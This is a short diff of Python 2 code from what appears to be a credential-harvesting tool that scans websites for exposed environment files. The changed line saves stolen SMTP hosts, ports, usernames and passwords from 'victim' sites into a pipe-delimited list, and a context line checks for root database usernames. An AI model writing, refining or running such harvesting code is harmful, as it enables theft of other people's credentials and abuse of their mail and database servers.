@@ -310,7 +310,7 @@ def kuy(lEnVy):
 
 					print "= = = = = = = = = = = = = = = = = = = = = = = ="
 
-					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
+					SEnVy.write(SMTP[0] + '|' + PORT[0] + '|' + USERNAME[0] + '|' + PASSWORD[0])
 
 
 			elif "DB_USERNAME=root" in rsmTP.text:
